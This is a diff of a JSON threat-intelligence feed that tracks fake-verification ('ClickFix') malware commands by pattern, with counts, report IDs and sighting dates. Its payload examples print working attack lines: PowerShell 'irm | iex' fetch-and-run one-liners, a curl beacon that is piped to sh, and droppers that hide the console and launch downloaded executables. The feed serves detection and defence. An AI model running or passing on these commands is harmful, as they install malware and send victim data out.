@@ -1,17 +1,11 @@
 [
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 136,
-    "ReportCount": 136,
-    "FirstSeen": "2026-11-10T21:06:54.833000+00:00",
-    "LastSeen": "2026-11-17T16:44:32.151000+00:00",
+    "DistinctPayloadCount": 132,
+    "ReportCount": 132,
+    "FirstSeen": "2026-11-10T21:35:14.910000+00:00",
+    "LastSeen": "2026-11-17T21:10:58.737000+00:00",
     "ReportIds": [
-      "cmwb6koh8014q0nmlcxbmrlrk",
-      "cmwb6qu7f01a90nml20iif7nj",
-      "cmwb6vhve01hj0nmlyr0vfnh6",
-      "cmwb6w6cv01io0nmlucn640p1",
-      "cmwb6wqag01jw0nmlnt7ujaq3",
-      "cmwb6xxtu01kl0nmlqd7co3td",
       "cmwb7l41601w90nml2u1gu0ov",
       "cmwb7lvml01y50nml49vrt35d",
       "cmwb7pen201zu0nmlsoa57b4g",
@@ -141,7 +135,9 @@
       "cmwkte9y71fs10omlyn3mr6rc",
       "cmwkwnzbj1gia0oml0nx35ejg",
       "cmwkwqmbs1glr0omlra35kmei",
-      "cmwkxa7s51h0n0oml0o4c58dz"
+      "cmwkxa7s51h0n0oml0o4c58dz",
+      "cmwl6e29x1ho90oml4soletk3",
+      "cmwl6sv421hpq0omls4ocdb1w"
     ],
     "PayloadExamples": [
       "irm 'browse-cloud.codes/013ce88bf8a96d89'|iex;",
@@ -150,6 +146,7 @@
       "irm 'browse-cloud.codes/062c477a90814654'|iex;",
       "irm 'browse-cloud.codes/133f5f853512bcb5'|iex;",
       "irm 'browse-cloud.codes/16caa5e6182fbdf4'|iex;",
+      "irm 'browse-cloud.codes/1c1a06922ba83122'|iex;",
       "irm 'browse-cloud.codes/1d9b91a9afa1746c'|iex;",
       "irm 'browse-cloud.codes/1ece21f576ccf983'|iex;",
       "irm 'browse-cloud.codes/2564bd608a5f29ab'|iex;",
@@ -214,6 +211,7 @@
       "irm 'browse-cloud.codes/e058fa21b0d6398a'|iex;",
       "irm 'browse-cloud.codes/e0d5e1e484132468'|iex;",
       "irm 'browse-cloud.codes/e0f86137ef78e8ec'|iex;",
+      "irm 'browse-cloud.codes/e1869d542b246dfd'|iex;",
       "irm 'browse-cloud.codes/e1b66155c1796380'|iex;",
       "irm 'browse-cloud.codes/e2a70f128e088e5a'|iex;",
       "irm 'browse-cloud.codes/ea55171f930bd17a'|iex;",
@@ -231,11 +229,9 @@
       "irm 'browse-cloud.codes/fe2aab3b32968bba'|iex;",
       "irm 'browse-nnccodes.beer/036cf7940c1ef98c'|iex;",
       "irm 'browse-nnccodes.beer/04f8fc1791e00fc8'|iex;",
-      "irm 'browse-nnccodes.beer/08a6dccf8af21787'|iex;",
       "irm 'browse-nnccodes.beer/092760569b04dd7c'|iex;",
       "irm 'browse-nnccodes.beer/0aa4b6ee05cd05e5'|iex;",
       "irm 'browse-nnccodes.beer/0bb98601c2aaf567'|iex;",
-      "irm 'browse-nnccodes.beer/0e479f5349efdb6d'|iex;",
       "irm 'browse-nnccodes.beer/174623c0f642d3eb'|iex;",
       "irm 'browse-nnccodes.beer/189b1694d7e41576'|iex;",
       "irm 'browse-nnccodes.beer/1ce85935d5e8d060'|iex;",
@@ -248,13 +244,11 @@
       "irm 'browse-nnccodes.beer/2caa31d3ba1b8b12'|iex;",
       "irm 'browse-nnccodes.beer/2dccc5387a5d5584'|iex;",
       "irm 'browse-nnccodes.beer/2efb6f6a92b0c99d'|iex;",
-      "irm 'browse-nnccodes.beer/313e1132c1e12019'|iex;",
       "irm 'browse-nnccodes.beer/349d377a86282d44'|iex;",
       "irm 'browse-nnccodes.beer/3740293579daa833'|iex;",
       "irm 'browse-nnccodes.beer/3f8a349007b400af'|iex;",
       "irm 'browse-nnccodes.beer/44f5c1c159276caa'|iex;",
       "irm 'browse-nnccodes.beer/69845b449b7231eb'|iex;",
-      "irm 'browse-nnccodes.beer/6c23bd6dae0e89ab'|iex;",
       "irm 'browse-nnccodes.beer/77ec859b6ca732cb'|iex;",
       "irm 'browse-nnccodes.beer/7ffbfcfa0fdc9160'|iex;",
       "irm 'browse-nnccodes.beer/84be581882fb11c6'|iex;",
@@ -272,24 +266,21 @@
       "irm 'browse-nnccodes.beer/ccee3ed87c8109ea'|iex;",
       "irm 'browse-nnccodes.beer/cd7f076054b8a4ce'|iex;",
       "irm 'browse-nnccodes.beer/cefc867900442c97'|iex;",
-      "irm 'browse-nnccodes.beer/d230586231576f76'|iex;",
       "irm 'browse-nnccodes.beer/d6635ac514ec3dc5'|iex;",
       "irm 'browse-nnccodes.beer/d7125fe2b22df9e3'|iex;",
       "irm 'browse-nnccodes.beer/de1cc1e870ff2e58'|iex;",
       "irm 'browse-nnccodes.beer/e0f433c5355ab6b9'|iex;",
-      "irm 'browse-nnccodes.beer/e18d1c790f9d8ed3'|iex;",
       "irm 'browse-nnccodes.beer/eda44de7cd33aa18'|iex;",
       "irm 'browse-nnccodes.beer/f5e3d430790185d2'|iex;"
     ]
   },
   {
     "Pattern": "curl -sL -d \"id=<UUID>&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=<ENCODED_URL>&os=Linux%20x86_64&lastVisitAt=<TIMESTAMP>&lastShellAt=<TIMESTAMP>\" \"<URL>\" && wget -qO- '<URL>' -L | sh",
-    "DistinctPayloadCount": 56,
-    "ReportCount": 56,
-    "FirstSeen": "2026-11-10T21:10:36.912000+00:00",
+    "DistinctPayloadCount": 55,
+    "ReportCount": 55,
+    "FirstSeen": "2026-11-10T21:40:09.253000+00:00",
     "LastSeen": "2026-11-17T16:39:56.362000+00:00",
     "ReportIds": [
-      "cmwb6pfm0018w0nmlotuah88g",
       "cmwb7rf82021p0nmli0ofq41p",
       "cmwb7v7i1025t0nml5t0xcclk",
       "cmwbez2fg06ao0nmlov0j0g7o",
@@ -379,7 +370,6 @@
       "curl -sL -d \"id=7e8fc7bb-c8b4-475a-aa0d-a0eee8b55a1a&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Falloyspectrum[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T09%3A37%3A11.462Z&lastShellAt=2026-11-11T09%3A37%3A11.462Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=7eed998f-5d31-4117-b764-40ed848e8cf8&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fwww[.]a-stergiou[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-15T03%3A48%3A24.713Z&lastShellAt=2026-11-15T03%3A48%3A24.713Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=7f21b552-6a42-42e4-8e21-66bd283b97fa&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Ftccgcc[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-15T13%3A08%3A20.080Z&lastShellAt=2026-11-15T13%3A08%3A20.080Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
-      "curl -sL -d \"id=8217a4bd-5db0-493f-a59c-d634628d1d28&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fmonadnockdevelopment[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-10T21%3A09%3A13.413Z&lastShellAt=2026-11-10T21%3A09%3A13.413Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=8483c18e-0d34-477d-a69f-39c2685acc7d&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Ffaizertraders[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-15T03%3A27%3A30.836Z&lastShellAt=2026-11-15T03%3A27%3A30.836Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=9559fe19-51b4-4fcc-9d02-2400bae2d826&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fdesrecettesfaciles[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-15T03%3A22%3A23.142Z&lastShellAt=2026-11-15T03%3A22%3A23.142Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=9e9e05df-8123-447c-87d9-7704081b893a&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fcollagenglowc[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T12%3A01%3A46.841Z&lastShellAt=2026-11-11T12%3A01%3A46.841Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
@@ -407,12 +397,11 @@
   },
   {
     "Pattern": "(irm '<URL>')|iex",
-    "DistinctPayloadCount": 43,
-    "ReportCount": 43,
-    "FirstSeen": "2026-11-10T21:20:06.377000+00:00",
+    "DistinctPayloadCount": 42,
+    "ReportCount": 42,
+    "FirstSeen": "2026-11-10T21:31:37.365000+00:00",
     "LastSeen": "2026-11-17T16:27:36.918000+00:00",
     "ReportIds": [
-      "cmwb71nav01nq0nmlm04mhxot",
       "cmwb7gg5t01t90nmlz5690sam",
       "cmwb9iguz037i0nmldasfla69",
       "cmwbajp3r04aa0nmljuneis7c",
@@ -496,7 +485,6 @@
       "(irm 'https://t-trustresnew[.]com/click/99ba2b847e73d63a')|iex",
       "(irm 'https://t-trustresnew[.]com/click/eb4c0ed8660ab961')|iex",
       "(irm 'https://t-trustresnew[.]com/wp/2b9b641bfb4bd784')|iex",
-      "(irm 'https://t-trustresnew[.]com/wp/64201dc7a70eedfa')|iex",
       "(irm 'https://t-trustresnew[.]com/wp/a6a5d675566d2662')|iex",
       "(irm 'https://t-trustresnew[.]com/wp/e61272334f7c2507')|iex",
       "(irm 'https://t-trustresnew[.]com/wp/ea91ecfa8614d564')|iex"
@@ -734,11 +722,10 @@
   {
     "Pattern": "$url = \"<URL>\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
     "DistinctPayloadCount": 2,
-    "ReportCount": 52,
-    "FirstSeen": "2026-11-10T21:13:06.192000+00:00",
+    "ReportCount": 51,
+    "FirstSeen": "2026-11-10T22:38:43.220000+00:00",
     "LastSeen": "2026-11-17T10:13:11.052000+00:00",
     "ReportIds": [
-      "cmwb6smrv01b60nml8jiru7wv",
       "cmwb9uqk303s00nmluopqulrr",
       "cmwba4v2m03zy0nmlqkjqqbz3",
       "cmwbbh8q704q80nmlzetfk82h",
@@ -925,21 +912,6 @@
     ]
   },
   {
-    "Pattern": "$t=$env:APPDATA+[char]92+\"n\";$z=$t+[char]92+\"n.zip\";New-Item -Path $t -ItemType Directory -Force|Out-Null;curl.exe -sL -o $z \"<URL>\";tar.exe -xf $z -C $t;Remove-Item $z;$e=Get-ChildItem $t -Recurse -Filter \"Beautifull.exe\"|Select-Object -First 1;if($e){$w=[wmiclass]\"Win32_Process\";$w.Create($e.FullName)|Out-Null};exit",
-    "DistinctPayloadCount": 1,
-    "ReportCount": 3,
-    "FirstSeen": "2026-11-10T21:14:36.266000+00:00",
-    "LastSeen": "2026-11-12T11:51:47.800000+00:00",
-    "ReportIds": [
-      "cmwb6ukb801fz0nmlybxc1x8x",
-      "cmwcf73lu07rj0omlahvm476x",
-      "cmwdhmhp504920omlkj1isj57"
-    ],
-    "PayloadExamples": [
-      "$t=$env:APPDATA+[char]92+\"n\";$z=$t+[char]92+\"n.zip\";New-Item -Path $t -ItemType Directory -Force|Out-Null;curl.exe -sL -o $z \"https://swingerwives[.]com\";tar.exe -xf $z -C $t;Remove-Item $z;$e=Get-ChildItem $t -Recurse -Filter \"Beautifull.exe\"|Select-Object -First 1;if($e){$w=[wmiclass]\"Win32_Process\";$w.Create($e.FullName)|Out-Null};exit"
-    ]
-  },
-  {
     "Pattern": "msiexec /i <URL> msiex...\n...ps://shift-art.com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ msiexec /i <URL> Verif...\nFake",
     "DistinctPayloadCount": 1,
     "ReportCount": 3,
@@ -955,6 +927,20 @@
     ]
   },
   {
+    "Pattern": "$t=$env:APPDATA+[char]92+\"n\";$z=$t+[char]92+\"n.zip\";New-Item -Path $t -ItemType Directory -Force|Out-Null;curl.exe -sL -o $z \"<URL>\";tar.exe -xf $z -C $t;Remove-Item $z;$e=Get-ChildItem $t -Recurse -Filter \"Beautifull.exe\"|Select-Object -First 1;if($e){$w=[wmiclass]\"Win32_Process\";$w.Create($e.FullName)|Out-Null};exit",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 2,
+    "FirstSeen": "2026-11-11T17:56:04.253000+00:00",
+    "LastSeen": "2026-11-12T11:51:47.800000+00:00",
+    "ReportIds": [
+      "cmwcf73lu07rj0omlahvm476x",
+      "cmwdhmhp504920omlkj1isj57"
+    ],
+    "PayloadExamples": [
+      "$t=$env:APPDATA+[char]92+\"n\";$z=$t+[char]92+\"n.zip\";New-Item -Path $t -ItemType Directory -Force|Out-Null;curl.exe -sL -o $z \"https://swingerwives[.]com\";tar.exe -xf $z -C $t;Remove-Item $z;$e=Get-ChildItem $t -Recurse -Filter \"Beautifull.exe\"|Select-Object -First 1;if($e){$w=[wmiclass]\"Win32_Process\";$w.Create($e.FullName)|Out-Null};exit"
+    ]
+  },
+  {
     "Pattern": "Invoke-WebRequest \"<URL>\" -OutFile $z",
     "DistinctPayloadCount": 1,
     "ReportCount": 2,
@@ -966,19 +952,6 @@
     ],
     "PayloadExamples": [
       "Invoke-WebRequest \"https://swingerwives[.]com\" -OutFile $z"
-    ]
-  },
-  {
-    "Pattern": "$close_btn_html='<svg class=\"eae-close\" style=\"-webkit-mask-image: url('+m(t.pop_icon.value.url)+\"); mask-image: url(\"+m(t.pop_icon.value.url)+'); \"></svg>'):$close_btn_html='<i class=\"eae-close '+m(t.pop_icon.value)+'\"> </i>',e(x).eaePopup({type:\"inline\",midClick:!0,mainClass:\"eae-coupon-popup eae-popup  eae-cc-\"+S,closeMarkup:$close_btn_html,closeBtnInside:\"yes\"==t.btn_in_out,callbacks:{beforeOpen:function(){\"\"!=t.effect&&(",
-    "DistinctPayloadCount": 1,
-    "ReportCount": 1,
-    "FirstSeen": "2026-11-10T21:15:03.591000+00:00",
-    "LastSeen": "2026-11-10T21:15:03.591000+00:00",
-    "ReportIds": [
-      "cmwb6v5e501gk0nmli6gxked5"
-    ],
-    "PayloadExamples": [
-      "$close_btn_html='<svg class=\"eae-close\" style=\"-webkit-mask-image: url('+m(t.pop_icon.value.url)+\"); mask-image: url(\"+m(t.pop_icon.value.url)+'); \"></svg>'):$close_btn_html='<i class=\"eae-close '+m(t.pop_icon.value)+'\"> </i>',e(x).eaePopup({type:\"inline\",midClick:!0,mainClass:\"eae-coupon-popup eae-popup  eae-cc-\"+S,closeMarkup:$close_btn_html,closeBtnInside:\"yes\"==t.btn_in_out,callbacks:{beforeOpen:function(){\"\"!=t.effect&&("
     ]
   },
   {
